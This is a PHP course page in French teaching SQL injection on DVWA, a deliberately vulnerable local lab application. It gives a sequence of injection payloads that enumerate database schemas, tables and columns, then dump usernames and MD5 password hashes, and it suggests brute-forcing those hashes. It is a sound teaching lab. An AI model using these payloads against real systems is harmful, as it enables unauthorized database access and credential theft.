<?php
require('../db/connexionDB.php');           // Fichier PHP contenant la connexion à la BDD
session_start();                            // On démarre la session
if(!isset($_SESSION['nickname']))           // S'il n'y a pas d'utilisateur connecté, redirection vers la page de connexion
{ 
  ?>
  <script language="Javascript">
    document.location.replace("../login");
  </script>
  <?php
}
?>

<!DOCTYPE html>
<html lang="fr">
  <?php // En-tête de la page ?>
  <head>
    <?php // Balises meta responsive ?>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale-1">

    <?php // Bootstrap CSS ?>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
    
    <?php // jQuery et Bootstrap JS ?>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    
    <?php // Feuille de style ?>
    <link rel="stylesheet" href="../style.css">

    <?php // Titre principal et icône de la page ?>
    <title>Injection SQL</title>
    <link rel="icon" type="image/png" sizes="16x16" href="../images/deathstarw.png">
  </head>

  <?php // Corps de la page ?>
  <body style="background-color: rgba(45,54,69)">
    <?php 
    // Inclusion de la barre de navigation
    require_once('menuCourses.php');

    // Mise en place d'un fil d'Arianne
    ?>
    <div class="centrer" style="box-shadow: 0 5px 5px rgba(0, 0, 0, .2);">  
      <div class="breadcrumb">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
              <li class="breadcrumb-item"><a href="../index">Accueil</a></li>
              <li class="breadcrumb-item"><a href="../course">Cours</a></li>
              <li class="breadcrumb-item active" aria-current="page">Injection SQL sur un site web vulnérable</li>
            </ol>
          </nav>
      </div>
      <h1>Injection SQL sur un site web vulnérable</h1>
      </br>
      </br>
    </div>
    </br>
    </br>
    <?php // Cours ?>
    <div class="container-fluid">
     
      
      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; text-align: justify; color: white">
            </br>
            L’objectif de cet exercice est d’étudier et tester différentes vulnérabilités d’une application Web vulnérable (DWVA) locale.
            </br>
            </br>
            DVWA est conçu pour les développeurs qui souhaitent apprendre à protéger leurs applications web. Damn Vulnerable Web App (DVWA) est une application Web PHP/MySQL, intentionnellement vulnérable. 
            </br>
            </br>
            Son but est d'aider les professionnels de la sécurité à tester leurs outils dans un environnement légal, d'aider les développeurs à une meilleure compréhension du processus de sécurisation des applications web.
            </br>
            </br>
            </br>
            </br>
            Une injection SQL est un type d'exploitation d'une faille de sécurité d'une application interagissant avec une base de données, en injectant une requête SQL non prévue par le système et pouvant compromettre sa sécurité. Dans le cas de notre application on a 3 niveaux de sécurité : LOW LEVEL, MEDIUM LEVEL et HIGH LEVEL.
            </br>
            </br>
            On se concentrera sur LOW.
            </br>
            </br>
            Il existe des cheat-sheet (aide-mémoire) concernant les commandes utiles pour réaliser des injections SQL
            </br>
            </br>
            <a target="_blank" style="text-decoration:underline" href="https://www.asafety.fr/mysql-injection-cheat-sheet/#Recuperer_le_nom_des_tables">https://www.asafety.fr/mysql-injection-cheat-sheet/#Recuperer_le_nom_des_tables</a>
            </br>
            </br>
            Vous trouverez ci-dessous dans commandes SQL permettant d'afficher des données contenues dans la base de données.          
            </br>
            </br>
            -	Afficher tous les utilisateurs :
            </br>
            </br>
            <kbd>1' or 1=1 -- '</kbd>
            </br>
          </p>
        </div>
      </div>


      <div class="row justify-content-center">
        <div class="group col-sm-0">      
        <img src="../images/sqldvwa1.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
        </div>
      </div>

      <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            -	Afficher la version de la base de données :
            </br>
            </br>
            <kbd>' union select 1, @@version -- '</kbd>
            </br>
         </div>
      </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/sqldvwa2.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div>


        <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            -	Afficher les tables INFORMATION_SCHEMA :
            </br>
            </br>
            <kbd>' union select 1, schema_name from information_schema.schemata -- -</kbd>
            </br>
         </div>
      </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/sqldvwa3.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div>

        <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            INFORMATION_SCHEMA est la base de données, l'endroit qui stocke des informations sur toutes les autres bases de données que le serveur MySQL entretient.
            </br>
            </br>
            -	Afficher toutes les tables :
            </br>
            </br>
            <kbd>1' UNION SELECT 1, table_name FROM information_schema.tables -- '</kbd>
            </br>
         </div>
      </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/sqldvwa4.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div>    

        <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            Comme nous pouvons le voir dans l'image ci-dessus, nous avons affichés tous les noms de tables que contient la base de données. Mais nous ne sommes pas intéressés par toutes les tables, nous chercherons éventuellement une table qui pourrait contenir un nom d'utilisateur et un mot de passe.
            </br>
         </div>
      </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/sqldvwa5.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div>    
    
        <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            -	Afficher la table « user » :
            </br>
            </br>
            <kbd>1' UNION SELECT 1, column_name FROM information_schema.columns where table_name='users' -- '</kbd>
            </br>
         </div>
      </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/sqldvwa6.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div> 

        <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            Maintenant, nous voulons un nom d'utilisateur et un mot de passe et nous pouvons voir dans l'image ci-dessus qu'il contient le nom de colonne « user » et « password ». 
            </br>
            </br>
            On cherche désormais tous les noms d'utilisateur et mot de passe en lançant une autre requête.
            </br>
            </br>
            -	Afficher l’utilisateur et le mot de passe de la table « user » :
            </br>
            </br>
            <kbd>1' UNION SELECT user, password FROM users -- '</kbd>
            </br>
         </div>
      </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/sqldvwa7.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div>

        <div class="row justify-content-center">
        <div class="group col-sm-8">
          <p style="font-size: 18px; color: white">
            </br>
            </br>
            Nous avons donc extrait les mots de passe de la table user.
            </br>
            </br>
            Les mots de passe sont en format de hash MD5, il est possible d’utiliser un outil de bruteforce pour récupérer les mots de passe en clair.
            </br>
         </div>
      </div>

        <div class="row justify-content-center">
          <div class="group col-sm-0">      
          <img src="../images/sqldvwa8.png" class="img-fluid" style="box-shadow: 0 16px 10px -8px rgba(0, 0, 0, .4);"/>
          </div>
        </div>   

    

    </div>
  </body>
  <?php 
  // Inclusion de la barre de navigation
  require_once('footerCourses.php'); 
  ?>
</html>